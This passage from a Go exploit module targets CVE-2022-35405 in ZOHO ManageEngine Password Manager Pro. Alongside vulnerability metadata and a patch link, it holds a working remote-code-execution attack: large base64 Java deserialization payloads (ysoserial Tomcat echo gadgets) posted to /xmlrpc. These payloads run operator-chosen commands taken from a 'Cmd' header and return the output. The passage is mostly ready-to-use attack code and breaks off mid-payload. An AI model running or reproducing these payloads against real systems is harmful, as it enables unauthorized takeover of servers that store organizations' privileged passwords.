XZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBADl5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL1RvbWNhdENtZEVjaG8yMDU2OTc0MDc0OTUxMDABADtMeXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9Ub21jYXRDbWRFY2hvMjA1Njk3NDA3NDk1MTAwOwAhAEQARQAAAAAABAABAEYARwABAEgAAAAvAAEAAQAAAAUqtwABsQAAAAIASQAAAAYAAQAAAAkASgAAAAwAAQAAAAUASwEEAAAAAQBNAE4AAgBIAAAAPwAAAAMAAAABsQAAAAIASQAAAAYAAQAAAFcASgAAACAAAwAAAAEASwEEAAAAAAABAE8AUAABAAAAAQBRAFIAAgBTAAAABAABAFQAAQBNAFUAAgBIAAAASQAAAAQAAAABsQAAAAIASQAAAAYAAQAAAFwASgAAACoABAAAAAEASwEEAAAAAAABAE8AUAABAAAAAQBWAFcAAgAAAAEAWABZAAMAUwAAAAQAAQBUAAgAWgBHAAEASAAABdUACAARAAAC/QM7uAACtgADTCu2AAQSBbYABk0sBLYABywrtgAIwAAJwAAJTgM2BBUELb6iAs0tFQQyOgUZBccABqcCuRkFtgAKOgYZBhILtgAMmgANGQYSDbYADJoABqcCmxkFtgAEEg62AAZNLAS2AAcsGQW2AAg6BxkHwQAPmgAGpwJ4GQe2AAQSELYABk0sBLYABywZB7YACDoHGQe2AAQSEbYABk2nABY6CBkHtgAEtgATtgATEhG2AAZNLAS2AAcsGQe2AAg6BxkHtgAEtgATEhS2AAZNpwAQOggZB7YABBIUtgAGTSwEtgAHLBkHtgAIOgcZB7YABBIVtgAGTSwEtgAHLBkHtgAIwAAWwAAWOggDNgkVCRkIuQAXAQCiAcsZCBUJuQAYAgA6ChkKtgAEEhm2AAZNLAS2AAcsGQq2AAg6CxkLtgAEEhoDvQAbtgAcGQsDvQAdtgAeOgwZC7YABBIfBL0AG1kDEiBTtgAcGQsEvQAdWQMSIVO2AB7AACA6BhkGxgFXGQa2ACKaAU8ZDLYABBIjBL0AG1kDsgAkU7YAHBkMBL0AHVkDuwAlWREAyLcAJlO2AB5XEie4ACi2ACkSKrYADJkAGQa9ACBZAxIrU1kEEixTWQUZBlOnABYGvQAgWQMSLVNZBBIuU1kFGQZTOg27AC9ZuwAwWRkNtwAxtgAytgAztwA0EjW2ADa2ADe2ADg6DhI5uAA6Og8ZD7YAOzoHGQ8SPAa9ABtZAxI9U1kEsgAkU1kFsgAkU7YAPhkHBr0AHVkDGQ5TWQS7ACVZA7cAJlNZBbsAJVkZDr63ACZTtgAeVxkMtgAEEj8EvQAbWQMZD1O2ABwZDAS9AB1ZAxkHU7YAHlenAE46DxJBuAA6OhAZEBJCBL0AG1kDEj1TtgA+GRAEvQAdWQMZDlO2AB46BxkMtgAEEj8EvQAbWQMZEFO2ABwZDAS9AB1ZAxkHU7YAHlcEOxqZAAanAAmECQGn/i8amQAGpwARpwAIOgWnAAOEBAGn/TKnAARLsQAIAJUAoACjABIAwwDRANQAEgITAoYCiQBAAC4AOQLtAEMAPABXAu0AQwBaAHoC7QBDAH0C5wLtAEMAAAL4AvsAQwADAEkAAAD+AD8AAAANAAIADgAJAA8AEwAQABgAEQAkABIALgAUADQAFQA8ABYAQwAXAFoAGABlABkAagAaAHIAGwB9ABwAiAAdAI0AHgCVACAAoAAjAKMAIQClACIAtgAkALsAJQDDACcA0QAqANQAKADWACkA4QArAOYALADuAC0A+QAuAP4ALwEMADABGwAxASYAMgExADMBNgA0AT4ANQFXADYBfQA3AYoAOAG1ADkB8AA6AhMAPAIaAD0CIQA+AmQAPwKGAEQCiQBAAosAQQKSAEICsgBDAtQARQLWAEcC3QAwAuMASQLqAEwC7QBKAu8ASwLyABIC+ABQAvsATwL8AFEASgAAANQAFQClABEAWwBcAAgA1gALAFsAXAAIAhoAbABdAF4ADwKSAEIAXQBeABACiwBJAF8AYAAPAfAA5gBhAGIADQITAMMAYwBkAA4BJgG3AGUAZgAKAT4BnwBnAGYACwFXAYYAaABmAAwBDwHUAGkAagAJADQCtgBrAGwABQBDAqcAbQBuAAYAcgJ4AG8AZgAHAQwB3gBwAHEACALvAAMAWwByAAUAJwLRAHMAagAEAAIC9gB0AHUAAAAJAu8AdgB3AAEAEwLlAHgAeQACACQC1AB6AHsAAwB8AAAAqAAX/wAnAAUBBwB9BwB+BwAJAQAA/AAUBwB//AAaBwCAAvwAIgcAgWUHAIISXQcAggz9AC0HAIMB/gDLBwCBBwCBBwCBUgcAhP8AmgAPAQcAfQcAfgcACQEHAH8HAIAHAIEHAIMBBwCBBwCBBwCBBwCEBwA9AAEHAIX7AEr5AAH4AAb6AAX/AAYABQEHAH0HAH4HAAkBAABCBwCGBP8ABQAAAABCBwCGAAABAIcAAAACAIh1cQB+ABAAAAHUyv66vgAAADMAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAxwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQACEFIRlBQR1hVcHcBAHhxAH4ADXg=</serializable>\n                    </value>\n                </member>\n            </struct>\n        </value>\n        </param>\n    </params>\n</methodCall>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "1f59a02b8121a2ca886bf842ad8c5cf1",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-35405"
    ],
    "CNNVD": [
        "CNNVD-202207-1615"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "ZOHO ManageEngine Password Manager Pro 远程代码执行漏洞（CVE-2022-35405）",
            "Product": "ZOHO ManageEngine Password Manager Pro",
            "Description": "<p>ZOHO ManageEngine Password Manager Pro是美国卓豪（ZOHO）公司的一款密码管理器。<br></p><p>ZOHO ManageEngine Password Manager Pro 12101 之前版本和PAM360 5510之前版本存在安全漏洞，攻击者可执行任意命令获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html\">https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html</a><br></p>",
            "Impact": "<p>ZOHO ManageEngine Password Manager Pro 12101 之前版本和PAM360 5510之前版本存在安全漏洞，攻击者可执行任意命令获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "ZOHO ManageEngine Password Manager Pro RCE (CVE-2022-35405)",
            "Product": "ZOHO ManageEngine Password Manager Pro",
            "Description": "<p>ZOHO ManageEngine Password Manager Pro is a password manager from the American company ZOHO.<br></p><p>ZOHO ManageEngine Password Manager Pro versions prior to 12101 and PAM360 prior to 5510 have security vulnerabilities, attackers can execute arbitrary commands to gain server privileges.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html\">https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html</a><br></p>",
            "Impact": "<p>ZOHO ManageEngine Password Manager Pro versions prior to 12101 and PAM360 prior to 5510 have security vulnerabilities, attackers can execute arbitrary commands to gain server privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)

			if ss.Params["AttackType"].(string) == "payload1" {
				uri := "/xmlrpc"
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Header.Store("Cmd",cmd)
				cfg.Header.Store("Content-Type","application/xml")
				cfg.Header.Store("X-Requested-With","XMLHttpRequest")
				cfg.Data = `<?xml version="1.0"?>
<methodCall>
    <methodName>asd</methodName>
    <params>
        <param>
        <value>
            <struct>
                <member>
                    <name>test</name>
                    <value>
                        <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAFpPK/rq+AAAAMgESCgA5AJEKAJIAkwoAkgCUBwCVCgAEAJYLAJcAmAcAmQoAmgCbCAB1CgCcAJ0KAJ4AnwoAngCgBwChCAB4BwCiCgAPAKMKAKQApQcApggATAgAbAgAbQcApwoAFgCoCgAWAKkIAF8HAKoKABoAqwgArAoArQCuCACvCgCwALEIAFEKABoAsgoAJQCzCAC0CgAlALUHALYIALcIALgIALkIALoKALsAvAoAuwC9CgC+AL8HAMAKAC0AwQgAwgoALQDDCgAtAMQKAC0AxQgAxgoAJQDHCgDIAMkKAK0AygcAywcBEAcAzQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAtTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvWm9ob1RvbWNhdEVjaG87AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAM4BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAAdpc0xpbnV4AQABWgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAJvMQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA3JlcQEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAdyZXF1ZXN0AQAbTG9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3Q7AQAIcmVzcG9uc2UBABxMb3JnL2FwYWNoZS9jb3lvdGUvUmVzcG9uc2U7AQABagEAAUkBAAljb25uZWN0b3IBAClMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvQ29ubmVjdG9yOwEAD3Byb3RvY29sSGFuZGxlcgEAI0xvcmcvYXBhY2hlL2NveW90ZS9Qcm90b2NvbEhhbmRsZXI7AQABbwEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5wcm9jZXNzb3JzTGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEAAWkBABlwYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyAQA2TG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1BhcmFsbGVsV2ViYXBwQ2xhc3NMb2FkZXI7AQAPc3RhbmRhcmRDb250ZXh0AQAqTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7AQAHY29udGV4dAEAEmFwcGxpY2F0aW9uQ29udGV4dAEALUxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0OwEAB3NlcnZpY2UBAA9zdGFuZGFyZFNlcnZpY2UBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkU2VydmljZTsBAApjb25uZWN0b3JzAQAqW0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9Db25uZWN0b3I7AQANU3RhY2tNYXBUYWJsZQcAlQcAmQcAzwcAoQcAogcAfAcA0AcA0QcA0gcApwcAqgcA0wcAtgcAVQcA1AcAwAcAywEAClNvdXJjZUZpbGUBABNab2hvVG9tY2F0RWNoby5qYXZhDAA6ADsHANUMANYA1wwA2ADZAQA0b3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvUGFyYWxsZWxXZWJhcHBDbGFzc0xvYWRlcgwA2gDbBwDcDADdAN4BAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0BwDSDADfAOAHAOEMAOIA4wcAzwwA5ADlDADmAOcBACtvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0AQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkU2VydmljZQwA6ADpBwDQDADqAOsBACJvcmcvYXBhY2hlL2NveW90ZS9BYnN0cmFjdFByb3RvY29sAQATamF2YS91dGlsL0FycmF5TGlzdAwA7ADtDADmAO4BABlvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0DADvAPABAANyY2UHANMMAPEA8gEAB29zLm5hbWUHAPMMAPQA9QwA9gD1DAD3APgBAAN3aW4MAPkA+gEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwD7DAD8AP0MAP4A/wcBAAwBAQECAQARamF2YS91dGlsL1NjYW5uZXIMADoBAwEAAlxhDAEEAQUMAQYBBwwBCAD4AQAADAEJAQoHAQsMAQwBDQwBDgEPAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAK3lzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvWm9ob1RvbWNhdEVjaG8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACdvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9Db25uZWN0b3IBACFvcmcvYXBhY2hlL2NveW90ZS9Qcm90b2NvbEhhbmRsZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAab3JnL2FwYWNoZS9jb3lvdGUvUmVzcG9uc2UBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxnZXRSZXNvdXJjZXMBACcoKUxvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdDsBACNvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdAEACmdldENvbnRleHQBAB8oKUxvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRleHQ7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA5maW5kQ29ubmVjdG9ycwEALCgpW0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9Db25uZWN0b3I7AQASZ2V0UHJvdG9jb2xIYW5kbGVyAQAlKClMb3JnL2FwYWNoZS9jb3lvdGUvUHJvdG9jb2xIYW5kbGVyOwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAtnZXRSZXNwb25zZQEAHigpTG9yZy9hcGFjaGUvY295b3RlL1Jlc3BvbnNlOwEACWFkZEhlYWRlcgEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0SGVhZGVyAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7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
                        </serializable>
                    </value>
                </member>
            </struct>
        </value>
        </param>
    </params>
</methodCall>`
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						expResult.Output = resp.RawBody
						expResult.Success = true
					}
				}
			}
			if ss.Params["AttackType"].(string) == "payload2" {
				uri := "/xmlrpc"
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Header.Store("Cmd",cmd)
				cfg.Header.Store("Content-Type","application/xml")
				cfg.Header.Store("X-Requested-With","XMLHttpRequest")
				cfg.Data = `<?xml version="1.0"?>
<methodCall>
    <methodName>asd</methodName>
    <params>
        <param>
        <value>
            <struct>
                <member>
                    <name>test</name>
                    <value>
